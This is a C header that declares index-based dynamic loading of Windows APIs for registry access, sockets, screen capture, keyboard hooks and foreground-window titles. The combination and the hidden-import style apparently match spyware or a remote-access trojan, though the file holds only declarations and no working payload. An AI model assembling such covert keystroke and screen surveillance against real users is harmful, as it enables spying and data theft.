#ifndef __LOAD_LIBRARY_H
#define __LOAD_LIBRARY_H

typedef int(*lib_FARPROC)();

typedef enum _lib_Advapi32_t
{
	lib_Advapi32 = 0x0,
	lib_RegGetValueA = 0x1,
	lib_RegSetKeyValueA = 0x2
}_lib_Advapi32;

typedef enum _lib_Ws2_32_t
{
	lib_Ws2_32 = 0x3,
	lib_WSAStartup = 0x4,
	lib_WSACleanup = 0x5,
	lib_recv = 0x6,
	lib_send = 0x7,
	lib_gethostbyname = 0x8,
	lib_closesocket = 0x9,
	lib_shutdown = 0xA,
	lib_setsockopt = 0xB,
	lib_ioctlsocket = 0xC,
	lib_socket = 0xD,
	lib_select = 0xE,
	lib_htons = 0xF,
	lib_connect = 0x10,
	lib_WSAFDIsSet = 0x11
}_lib_Ws2_32;

typedef enum _lib_Gdi32_t
{
	lib_Gdi32 = 0x12,
	lib_SelectObject = 0x13,
	lib_CreateCompatibleDC = 0x14,
	lib_CreateCompatibleBitmap = 0x15,
	lib_SetStretchBltMode = 0x16,
	lib_StretchBlt = 0x17,
	lib_GetDIBits = 0x18,
	lib_DeleteObject = 0x19,
	lib_DeleteDC = 0x1A
}_lib_Gdi32;

typedef enum _lib_Psapi_t
{
	lib_Psapi = 0x1B,
	lib_GetModuleFileNameExA = 0x1C
}_lib_Psapi;

typedef enum _lib_User32_t
{
	lib_User32 = 0x1D,
	lib_SetWindowsHookExA = 0x1E,
	lib_GetMessageA = 0x1F,
	lib_TranslateMessage = 0x20,
	lib_DispatchMessageA = 0x21,
	lib_GetKeyState = 0x22,
	lib_CallNextHookEx = 0x23,
	lib_GetForegroundWindow = 0x24,
	lib_GetWindowTextA = 0x25
}_lib_User32;

extern void* loadLibrary_Load(int idx);
extern lib_FARPROC loadLibrary_LoadFunc(void* hmod, int idx);

#endif